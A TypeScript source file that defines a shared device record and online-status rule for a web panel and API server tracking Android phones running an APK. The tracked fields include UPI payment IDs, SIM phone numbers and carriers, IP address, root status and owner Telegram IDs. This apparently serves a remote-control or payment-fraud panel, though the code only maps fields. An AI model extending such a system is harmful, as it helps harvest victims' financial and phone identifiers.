/**
 * Device — single source for NormalizedDevice + isOnline rule.
 * Both web-panel and api-server import from here (workspace:*).
 * Old APK: ping timestamp (<5 min) ; New APK: lastPing / status boolean.
 * // ponytail: sync pure fn, no DB dep — keep Device as data shape, not service.
 */

export interface NormalizedDevice {
  id: string;
  model: string;
  phone: string;
  upi: string;
  battery: string;
  sim1: string;
  sim2: string;
  isOnline: boolean;
  ping?: string;
  status?: boolean | string;
  ownerTelegramId?: string;
  androidV?: string;
  sdkV?: string;
  ip_address?: string;
  storage?: string;
  cpu_arch?: string;
  isRoot?: boolean;
  isSdCard?: boolean;
  joined?: string;
  joinedTs?: number;
  lastPing?: number;
  label?: string;
  service_provider?: string;
  group?: string;
  deviceName?: string;
  colorTag?: string;
  raw: Record<string, any>;
}

function parseJoinedTs(raw: Record<string, any>): number {
  const s = raw.joined;
  if (!s) return 0;
  const m =
    /(\d{2})\/(\d{2})\/(\d{4})\s*\|\s*(\d{1,2}):(\d{2})\s*(am|pm)/i.exec(
      String(s)
    );
  if (!m) return 0;
  let h = parseInt(m[4], 10);
  const min = parseInt(m[5], 10);
  const dd = parseInt(m[1], 10);
  const mm = parseInt(m[2], 10);
  const yyyy = parseInt(m[3], 10);
  const ap = m[6].toLowerCase();
  if (ap === "pm" && h < 12) h += 12;
  if (ap === "am" && h === 12) h = 0;
  const t = new Date(yyyy, mm - 1, dd, h, min, 0).getTime();
  return isNaN(t) ? 0 : t;
}

export function isOnlineRaw(
  raw: Record<string, any>,
  now = Date.now()
): boolean {
  const t = raw.ping ?? raw.lastPing;
  if (t != null) {
    const n = Number(t);
    if (!isNaN(n)) return now - n < 300_000;
  }
  if (typeof raw.status === "boolean") return raw.status;
  if (typeof raw.status === "string")
    return raw.status === "true" || raw.status === "online";
  return false;
}

// keep legacy name for callers that imported isOnline from api-server/lib/device
export const isOnline = isOnlineRaw;

export function normalizeDevice(
  id: string,
  raw: Record<string, any>
): NormalizedDevice {
  const model = raw.modelName || raw.model || "Unknown";
  const phone = raw.mobNo || raw.phone || "";

  let sim1 = raw.sim1 || "";
  let sim2 = raw.sim2 || "";
  if (Array.isArray(raw.sims)) {
    if (raw.sims[0]) {
      const s = raw.sims[0];
      sim1 = [s.phoneNumber, s.carrierName].filter(Boolean).join(" · ");
    }
    if (raw.sims[1]) {
      const s = raw.sims[1];
      sim2 = [s.phoneNumber, s.carrierName].filter(Boolean).join(" · ");
    }
  }

  const isOnline = isOnlineRaw(raw);

  return {
    id,
    model,
    phone,
    upi: raw.upi || "",
    battery: raw.battery || "",
    sim1,
    sim2,
    isOnline,
    ping: raw.ping,
    status: raw.status,
    ownerTelegramId: raw.ownerTelegramId,
    androidV: raw.androidV,
    sdkV: raw.sdkV,
    ip_address: raw.ip_address,
    storage: raw.storage,
    cpu_arch: raw.cpu_arch,
    isRoot: raw.isRoot,
    isSdCard: raw.isSdCard,
    joined: raw.joined,
    joinedTs: parseJoinedTs(raw),
    lastPing:
      typeof raw.lastPing === "number"
        ? raw.lastPing
        : Number(raw.lastPing || 0) || undefined,
    label: raw.label,
    group: raw.group || "",
    deviceName: raw.deviceName || "",
    colorTag: raw.colorTag || "",
    service_provider: raw.service_provider,
    raw,
  };
}

/** Async wrapper for api-server callers that used fromRaw. */
export async function fromRaw(
  id: string,
  raw: Record<string, any>
): Promise<NormalizedDevice> {
  return normalizeDevice(id, raw);
}
